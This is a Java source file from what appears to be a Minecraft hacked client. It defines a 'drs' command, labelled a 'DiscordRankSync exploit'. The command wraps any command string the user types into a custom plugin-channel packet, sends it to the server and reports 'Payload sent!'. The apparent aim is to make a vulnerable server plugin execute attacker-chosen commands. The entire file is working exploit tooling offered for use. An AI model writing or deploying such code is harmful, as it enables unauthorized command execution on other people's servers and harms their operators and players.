package net.paradise_client.command.impl;

import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.context.CommandContext;
import net.paradise_client.Helper;
import net.minecraft.command.CommandSource;
import net.minecraft.network.packet.c2s.common.CustomPayloadC2SPacket;
import net.paradise_client.command.Command;
import net.paradise_client.packet.DiscordRankSyncPacket;

public class DiscordRankSync extends Command {
    public DiscordRankSync() {
        super("drs", "DiscordRankSync exploit", false);
    }

    @Override
    public LiteralArgumentBuilder<CommandSource> build() {
        return LiteralArgumentBuilder.<CommandSource>literal(this.getName())
            .executes(this::incompleteCommand)
            .then(
                com.mojang.brigadier.builder.RequiredArgumentBuilder
                    .<CommandSource, String>argument("command", StringArgumentType.greedyString())
                    .executes(context -> {
                        Helper.sendPacket(new CustomPayloadC2SPacket(
                            new DiscordRankSyncPacket(context.getArgument("command", String.class))
                        ));
                        Helper.printChatMessage("Payload sent!");
                        return 1;
                    })
            );
    }

    private int incompleteCommand(CommandContext<CommandSource> context) {
        Helper.printChatMessage("Incomplete command!");
        return 1;
    }
}
